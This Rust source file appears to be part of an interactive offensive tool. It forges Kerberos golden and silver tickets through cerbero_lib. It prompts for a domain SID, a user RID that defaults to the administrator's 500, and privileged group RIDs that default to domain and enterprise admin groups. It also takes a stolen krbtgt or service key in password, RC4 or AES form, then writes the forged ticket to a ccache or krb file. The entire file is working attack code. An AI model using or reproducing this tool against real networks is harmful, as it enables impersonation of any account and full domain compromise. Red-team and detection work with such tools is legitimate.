use cerbero_lib::{craft_ticket_info, CredFormat, FileVault, KrbUser, TicketCreds, Vault};
use dialoguer::Input;
use kerberos_crypto::Key;
use ms_pac::PISID;
use std::convert::TryInto;

pub fn run_craft() -> Result<(), Box<dyn std::error::Error>> {
    println!("\n=== Golden/Silver Ticket Crafter ===");
    println!("Create forged Kerberos tickets\n");

    let user_input: String = Input::new()
        .with_prompt("User (domain/username)")
        .interact_text()?;

    let user: KrbUser = user_input.as_str().try_into().map_err(|e: String| e)?;

    let realm_sid: String = Input::new()
        .with_prompt("Domain SID (e.g., S-1-5-21-...)")
        .interact_text()?;

    let user_rid: String = Input::new()
        .with_prompt("User RID")
        .default("500".to_string())
        .interact_text()?;

    let user_rid_u32: u32 = user_rid.parse().map_err(|_| "Invalid RID")?;

    let groups_input: String = Input::new()
        .with_prompt("Group RIDs (comma-separated)")
        .default("513,512,520,518,519".to_string())
        .interact_text()?;

    let groups: Vec<u32> = groups_input
        .split(',')
        .filter_map(|s| s.trim().parse().ok())
        .collect();

    let service: Option<String> = Input::new()
        .with_prompt("Service SPN (leave empty for golden ticket)")
        .allow_empty(true)
        .interact_text()
        .ok()
        .filter(|s: &String| !s.is_empty());

    let key_type: String = Input::new()
        .with_prompt("Key type (password/rc4/aes256)")
        .default("aes256".to_string())
        .interact_text()?;

    let key_value: String = Input::new()
        .with_prompt(format!("Enter {} key", key_type))
        .interact_text()?;

    let user_key = match key_type.to_lowercase().as_str() {
        "password" => Key::Secret(key_value),
        "rc4" | "ntlm" => {
            let key_bytes = hex::decode(&key_value).map_err(|_| "Invalid RC4/NTLM hash")?;
            Key::RC4Key(
                key_bytes
                    .try_into()
                    .map_err(|_| "RC4 key must be 16 bytes (32 hex chars)")?,
            )
        }
        "aes128" => {
            let key_bytes = hex::decode(&key_value).map_err(|_| "Invalid AES128 key")?;
            Key::AES128Key(
                key_bytes
                    .try_into()
                    .map_err(|_| "AES128 key must be 16 bytes (32 hex chars)")?,
            )
        }
        "aes256" | "aes" => {
            let key_bytes = hex::decode(&key_value).map_err(|_| "Invalid AES256 key")?;
            Key::AES256Key(
                key_bytes
                    .try_into()
                    .map_err(|_| "AES256 key must be 32 bytes (64 hex chars)")?,
            )
        }
        _ => return Err("Invalid key type. Use: password, rc4, aes128, or aes256".into()),
    };

    let output_file: String = Input::new()
        .with_prompt("Output file")
        .default(format!("{}.ccache", user.name))
        .interact_text()?;

    let format_input: String = Input::new()
        .with_prompt("Output format (ccache/krb)")
        .default("ccache".to_string())
        .interact_text()?;

    let cred_format = match format_input.to_lowercase().as_str() {
        "krb" => CredFormat::Krb,
        "ccache" => CredFormat::Ccache,
        _ => return Err("Invalid format. Use 'ccache' or 'krb'".into()),
    };

    println!("\n[*] Crafting ticket...");

    let realm_sid_parsed: PISID = realm_sid
        .as_str()
        .try_into()
        .map_err(|_| format!("Invalid SID format: {}", realm_sid))?;

    let ticket_info = craft_ticket_info(
        user.clone(),
        service.clone(),
        user_key,
        user_rid_u32,
        realm_sid_parsed,
        &groups,
        None,
    );

    let krb_cred = TicketCreds::new(vec![ticket_info]);

    let vault = FileVault::new(output_file.clone());
    vault
        .save_as(krb_cred, cred_format)
        .map_err(|e| format!("Failed to save ticket: {:?}", e))?;

    if let Some(ref spn) = service {
        println!("[*] Saved {} TGS for {} in {}", user.name, spn, output_file);
    } else {
        println!("[*] Saved {} TGT in {}", user.name, output_file);
    }

    println!("\x1b[32m[+] Ticket crafted successfully\x1b[0m");

    Ok(())
}
